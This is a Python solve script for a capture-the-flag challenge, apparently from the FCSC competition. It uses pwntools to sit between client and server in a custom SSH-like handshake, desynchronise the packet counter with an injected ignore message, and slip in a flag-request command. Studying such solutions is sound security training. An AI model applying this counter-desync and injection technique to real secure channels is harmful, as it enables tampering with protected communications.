from src.common import *
from pwn import remote, context, Timeout
# context.log_level = 'debug'

SERVER = 0
CLIENT = 1

CMD_MAP = {
    CMD_STRING_VERSION            : "CMD_STRING_VERSION",           
    CMD_KEXDH_INIT                : "CMD_KEXDH_INIT",               
    CMD_KEXDH_REPLY               : "CMD_KEXDH_REPLY",              
    CMD_NEWKEYS                   : "CMD_NEWKEYS",                  
    CMD_IGNORE                    : "CMD_IGNORE",                   
    CMD_PING                      : "CMD_PING",                     
    CMD_PONG                      : "CMD_PONG",                     
    CMD_DISABLE_SC                : "CMD_DISABLE_SC",               
    CMD_SC_SERVER_ADDITIONAL_INFO : "CMD_SC_SERVER_ADDITIONAL_INFO",
    CMD_GET_FLAG                  : "CMD_GET_FLAG",                 
}

ID_MAP = {
    SERVER: "SERVER",
    CLIENT: "CLIENT",
}

def from_raw(raw: bytes):
    cmd, payload = raw[1:2], raw[2:]
    assert raw[0] == len(payload) + 1
    return cmd, payload

def to_raw(cmd: bytes, payload: bytes):
    return (len(cmd) + len(payload)).to_bytes(1) + cmd + payload

def read(timeout=None):
    if timeout:
        if not io.recvuntil(b'action: ', timeout=timeout):
            raise TimeoutError
    else:
        io.recvuntil(b'action: ')

    id = int(b'CLIENT' in io.recvline())
    io.sendlineafter(b'actions\n', f'R{id}'.encode())
    raw = bytes.fromhex(io.recvline(False).decode())
    return id, raw


def edit(id: int, raw: bytes):
    io.sendlineafter(b'actions\n', f'E{id}{raw.hex()}'.encode())

def next():
    io.sendlineafter(b'actions\n', b'Q')


while 1:
    # io = remote('localhost', '4000')
    io = remote('challenges.france-cybersecurity-challenge.fr', '2154')

    # STRING_VERSION
    next()
    next()

    # CLIENT KEXDH_INIT
    next()

    # SERVER KEXDH_REPLY
    next()

    # CLIENT NEWKEYS
    next()

    # SERVER NEWKEYS
    id, raw = read()
    assert id == SERVER and from_raw(raw)[0] == CMD_NEWKEYS
    edit(id, to_raw(CMD_IGNORE, b'') + raw) # desync packet counter
    next()

    # SERVER SC_SERVER_ADDITIONAL_INFO
    edit(SERVER, b'') # resync packet counter
    next()

    # SERVER GET_FLAG
    id, raw = read()
    edit(id, raw + to_raw(CMD_GET_FLAG, b''))
    next()

    context.log_level = 'debug'

    # FLAG ?
    try:
        print('Waiting...')
        id, raw = read(timeout=2)
        if b'FCSC' in raw:
            print('='*50)
            print(raw)
            print('='*50)
            break
        else:
            print('-'*50)
            print('RAW:', raw)
            print('-'*50)
    except TimeoutError:
        print('-'*30)
        print('No luck this time!')
        print('-'*30)
    except EOFError:
        print('\nBUFFER:', io.buffer.data, '\n')
        import traceback as tb
        tb.print_exc()
        break
    finally:
        io.close()
        context.log_level = 'error'